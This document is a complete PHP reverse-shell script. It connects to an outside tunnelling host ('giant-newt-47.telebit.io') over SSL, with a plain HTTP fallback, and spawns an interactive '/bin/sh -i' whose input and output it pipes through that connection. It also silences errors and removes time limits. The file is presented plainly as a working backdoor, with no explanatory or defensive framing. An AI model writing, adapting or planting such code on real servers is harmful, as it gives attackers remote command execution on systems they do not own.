<?php
error_reporting(0);
set_time_limit(0);

// Connect to Telebit HTTPS endpoint (port 443)
$telebit_host = "giant-newt-47.telebit.io";
$port = 443; // Telebit uses HTTPS on port 443

echo "Connecting to Telebit: $telebit_host:$port<br>";
flush();

// Use SSL connection for HTTPS
$sock = @fsockopen("ssl://" . $telebit_host, $port, $errno, $errstr, 30);

if (!$sock) {
    // Fallback to regular HTTP if SSL fails
    $sock = @fsockopen($telebit_host, 80, $errno, $errstr, 30);
}

if (!$sock) {
    die("Failed to connect to Telebit: $errstr");
}

echo "Connected to Telebit! Tunnel active.<br>";
flush();

// Start reverse shell
$process = proc_open('/bin/sh -i', array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
), $pipes);

if (!is_resource($process)) {
    fclose($sock);
    die("Failed to start shell");
}

// Set non-blocking
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

echo "Reverse shell active through Telebit tunnel!<br>";
flush();

// Main loop
while (true) {
    if (feof($sock) || feof($pipes[1])) break;
    
    $status = proc_get_status($process);
    if (!$status['running']) break;
    
    // Telebit → Shell
    $input = fread($sock, 1024);
    if ($input) fwrite($pipes[0], $input);
    
    // Shell → Telebit
    $output = fread($pipes[1], 1024);
    if ($output) fwrite($sock, $output);
    
    $error = fread($pipes[2], 1024);
    if ($error) fwrite($sock, $error);
    
    usleep(100000);
}

// Cleanup
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

echo "Connection closed.";
?>